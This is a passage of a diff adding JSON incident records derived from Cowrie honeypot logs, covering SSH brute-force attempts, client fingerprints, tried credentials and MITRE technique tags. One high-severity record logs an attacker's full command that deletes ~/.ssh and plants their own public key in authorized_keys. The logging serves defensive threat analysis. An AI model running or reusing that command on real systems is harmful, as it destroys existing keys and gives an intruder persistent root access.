+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "112.28.73.142",
+          "src_port": 57530,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:21:40.739556Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-OpenSSH_7.4",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:21:41.382042Z",
+          "src_ip": "112.28.73.142",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
+          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
+          "kexAlgs": [
+            "diffie-hellman-group1-sha1",
+            "diffie-hellman-group14-sha1",
+            "diffie-hellman-group14-sha256",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group-exchange-sha1",
+            "diffie-hellman-group-exchange-sha256",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ext-info-c"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ssh-ed25519-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp256",
+            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+            "ssh-rsa",
+            "ssh-rsa-cert-v01@openssh.com",
+            "ssh-dss",
+            "ssh-dss-cert-v01@openssh.com"
+          ],
+          "encCS": [
+            "des",
+            "3des",
+            "blowfish",
+            "none",
+            "3des-cbc",
+            "blowfish-cbc",
+            "cast128-cbc",
+            "arcfour",
+            "arcfour128",
+            "arcfour256",
+            "aes128-cbc",
+            "aes192-cbc",
+            "aes256-cbc",
+            "rijndael-cbc@lysator.liu.se",
+            "aes128-ctr",
+            "aes192-ctr",
+            "aes256-ctr",
+            "aes128-gcm@openssh.com",
+            "aes256-gcm@openssh.com",
+            "chacha20-poly1305@openssh.com"
+          ],
+          "macCS": [
+            "hmac-sha1",
+            "hmac-sha1-96",
+            "hmac-sha2-256",
+            "hmac-sha2-512",
+            "hmac-md5",
+            "hmac-md5-96",
+            "hmac-ripemd160",
+            "hmac-ripemd160@openssh.com",
+            "umac-64@openssh.com",
+            "umac-128@openssh.com",
+            "hmac-sha1-etm@openssh.com",
+            "hmac-sha1-96-etm@openssh.com",
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-md5-etm@openssh.com",
+            "hmac-md5-96-etm@openssh.com",
+            "hmac-ripemd160-etm@openssh.com",
+            "umac-64-etm@openssh.com",
+            "umac-128-etm@openssh.com"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com",
+            "zlib"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:21:41.382943Z",
+          "src_ip": "112.28.73.142",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "default",
+          "password": "123",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:21:43.560908Z",
+          "src_ip": "112.28.73.142",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "4.3",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:21:45.050968Z",
+          "src_ip": "112.28.73.142",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-1174a22bf924",
+      "src_ip": "112.86.146.178",
+      "first_seen": "2026-04-02T08:26:44.637666Z",
+      "last_seen": "2026-04-02T08:26:48.748380Z",
+      "duration_seconds": 4,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "112.86.146.178",
+          "src_port": 55925,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:26:44.637666Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-OpenSSH_7.4",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:26:45.390464Z",
+          "src_ip": "112.86.146.178",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
+          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
+          "kexAlgs": [
+            "diffie-hellman-group1-sha1",
+            "diffie-hellman-group14-sha1",
+            "diffie-hellman-group14-sha256",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group-exchange-sha1",
+            "diffie-hellman-group-exchange-sha256",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ext-info-c"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ssh-ed25519-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp256",
+            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+            "ssh-rsa",
+            "ssh-rsa-cert-v01@openssh.com",
+            "ssh-dss",
+            "ssh-dss-cert-v01@openssh.com"
+          ],
+          "encCS": [
+            "des",
+            "3des",
+            "blowfish",
+            "none",
+            "3des-cbc",
+            "blowfish-cbc",
+            "cast128-cbc",
+            "arcfour",
+            "arcfour128",
+            "arcfour256",
+            "aes128-cbc",
+            "aes192-cbc",
+            "aes256-cbc",
+            "rijndael-cbc@lysator.liu.se",
+            "aes128-ctr",
+            "aes192-ctr",
+            "aes256-ctr",
+            "aes128-gcm@openssh.com",
+            "aes256-gcm@openssh.com",
+            "chacha20-poly1305@openssh.com"
+          ],
+          "macCS": [
+            "hmac-sha1",
+            "hmac-sha1-96",
+            "hmac-sha2-256",
+            "hmac-sha2-512",
+            "hmac-md5",
+            "hmac-md5-96",
+            "hmac-ripemd160",
+            "hmac-ripemd160@openssh.com",
+            "umac-64@openssh.com",
+            "umac-128@openssh.com",
+            "hmac-sha1-etm@openssh.com",
+            "hmac-sha1-96-etm@openssh.com",
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-md5-etm@openssh.com",
+            "hmac-md5-96-etm@openssh.com",
+            "hmac-ripemd160-etm@openssh.com",
+            "umac-64-etm@openssh.com",
+            "umac-128-etm@openssh.com"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com",
+            "zlib"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:26:45.391288Z",
+          "src_ip": "112.86.146.178",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "Config",
+          "password": "administrator",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:26:47.255437Z",
+          "src_ip": "112.86.146.178",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "4.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:26:48.748380Z",
+          "src_ip": "112.86.146.178",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-020c6671d958",
+      "src_ip": "45.79.131.203",
+      "first_seen": "2026-04-02T08:29:16.478193Z",
+      "last_seen": "2026-04-02T08:29:48.450018Z",
+      "duration_seconds": 31,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "45.79.131.203",
+          "src_port": 61000,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2323,
+          "protocol": "telnet",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:29:16.478193Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": 31.97193431854248,
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:29:48.450018Z",
+          "src_ip": "45.79.131.203",
+          "protocol": "telnet",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-18074236ad7e",
+      "src_ip": "179.184.85.167",
+      "first_seen": "2026-04-02T08:35:26.888001Z",
+      "last_seen": "2026-04-02T08:35:32.079619Z",
+      "duration_seconds": 5,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "179.184.85.167",
+          "src_port": 45864,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:35:26.888001Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-OpenSSH_7.4",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:35:27.795637Z",
+          "src_ip": "179.184.85.167",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
+          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
+          "kexAlgs": [
+            "diffie-hellman-group1-sha1",
+            "diffie-hellman-group14-sha1",
+            "diffie-hellman-group14-sha256",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group-exchange-sha1",
+            "diffie-hellman-group-exchange-sha256",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ext-info-c"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ssh-ed25519-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp256",
+            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+            "ssh-rsa",
+            "ssh-rsa-cert-v01@openssh.com",
+            "ssh-dss",
+            "ssh-dss-cert-v01@openssh.com"
+          ],
+          "encCS": [
+            "des",
+            "3des",
+            "blowfish",
+            "none",
+            "3des-cbc",
+            "blowfish-cbc",
+            "cast128-cbc",
+            "arcfour",
+            "arcfour128",
+            "arcfour256",
+            "aes128-cbc",
+            "aes192-cbc",
+            "aes256-cbc",
+            "rijndael-cbc@lysator.liu.se",
+            "aes128-ctr",
+            "aes192-ctr",
+            "aes256-ctr",
+            "aes128-gcm@openssh.com",
+            "aes256-gcm@openssh.com",
+            "chacha20-poly1305@openssh.com"
+          ],
+          "macCS": [
+            "hmac-sha1",
+            "hmac-sha1-96",
+            "hmac-sha2-256",
+            "hmac-sha2-512",
+            "hmac-md5",
+            "hmac-md5-96",
+            "hmac-ripemd160",
+            "hmac-ripemd160@openssh.com",
+            "umac-64@openssh.com",
+            "umac-128@openssh.com",
+            "hmac-sha1-etm@openssh.com",
+            "hmac-sha1-96-etm@openssh.com",
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-md5-etm@openssh.com",
+            "hmac-md5-96-etm@openssh.com",
+            "hmac-ripemd160-etm@openssh.com",
+            "umac-64-etm@openssh.com",
+            "umac-128-etm@openssh.com"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com",
+            "zlib"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:35:27.796362Z",
+          "src_ip": "179.184.85.167",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "postgres",
+          "password": "123",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:35:30.260976Z",
+          "src_ip": "179.184.85.167",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "5.2",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:35:32.079619Z",
+          "src_ip": "179.184.85.167",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-92b607428613",
+      "src_ip": "103.72.147.99",
+      "first_seen": "2026-04-02T08:37:02.500338Z",
+      "last_seen": "2026-04-02T08:37:06.160189Z",
+      "duration_seconds": 3,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+      ],
+      "downloads": [
+        {
+          "url": "",
+          "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"
+        }
+      ],
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1105",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "103.72.147.99",
+          "src_port": 38856,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:02.500338Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:02.501021Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "03a80b21afa810682a776a7d42e5e6fb",
+          "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+          "kexAlgs": [
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group-exchange-sha256",
+            "diffie-hellman-group14-sha256",
+            "ext-info-c",
+            "kex-strict-c-v00@openssh.com"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp256",
+            "sk-ssh-ed25519@openssh.com",
+            "sk-ecdsa-sha2-nistp256@openssh.com",
+            "rsa-sha2-512",
+            "rsa-sha2-256"
+          ],
+          "encCS": [
+            "chacha20-poly1305@openssh.com",
+            "aes256-gcm@openssh.com",
+            "aes128-gcm@openssh.com",
+            "aes256-ctr",
+            "aes192-ctr",
+            "aes128-ctr"
+          ],
+          "macCS": [
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-sha2-256",
+            "hmac-sha2-512"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:02.605251Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.success",
+          "username": "root",
+          "password": "marco",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.063030Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.login.success"
+        },
+        {
+          "eventid": "cowrie.session.params",
+          "arch": "linux-arm-lsb",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.333900Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.session.params"
+        },
+        {
+          "eventid": "cowrie.command.input",
+          "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.334399Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.command.input"
+        },
+        {
+          "eventid": "cowrie.command.failed",
+          "input": "lockr -ia .ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.335314Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.command.failed"
+        },
+        {
+          "eventid": "cowrie.log.closed",
+          "ttylog": "var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644",
+          "size": 32,
+          "shasum": "c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644",
+          "duplicate": true,
+          "duration": "0.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.440682Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "eventid": "cowrie.session.params",
+          "arch": "linux-arm-lsb",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.668606Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.session.params"
+        },
+        {
+          "eventid": "cowrie.command.input",
+          "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.669091Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.command.input"
+        },
+        {
+          "eventid": "cowrie.session.file_download",
+          "duplicate": true,
+          "outfile": "var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+          "shasum": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+          "destfile": "/root/.ssh/authorized_keys",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.776007Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.session.file_download"
+        },
+        {
+          "eventid": "cowrie.log.closed",
+          "ttylog": "var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f",
+          "size": 0,
+          "shasum": "cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f",
+          "duplicate": true,
+          "duration": "0.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.776546Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "3.7",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:06.160189Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-73a0eff23353",
+      "src_ip": "103.72.147.99",
+      "first_seen": "2026-04-02T08:37:03.859509Z",
+      "last_seen": "2026-04-02T08:37:05.451094Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "103.72.147.99",
+          "src_port": 38870,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.859509Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:37:03.860180Z",
+          "src_ip": "103.72.147.99",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "03a80b21afa810682a776a7d42e5e6fb",
+          "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+          "kexAlgs": [
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group-exchange-sha256",
+            "diffie-hellman-group14-sha256",
+            "ext-info-c",
+            "kex-strict-c-v00@openssh.com"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp256",
+            "sk-ssh-ed25519@openssh.com",
+            "sk-ecdsa-sha2-nistp256@openssh.com",
+            "rsa-sha2-512",
+            "rsa-sha2-256"
+          ],
+          "encCS": [
+            "chacha20-poly1305@openssh.com",
+            "aes256-gcm@openssh.com",
+            "aes128-gcm@openssh.com",
+            "aes256-ctr",
+            "aes192-ctr",
+            "aes128-ctr"
+          ],
+          "macCS": [
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-sha2-256",
+            "hmac-sha2-512"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com"
+          ],
+          "langCS": [
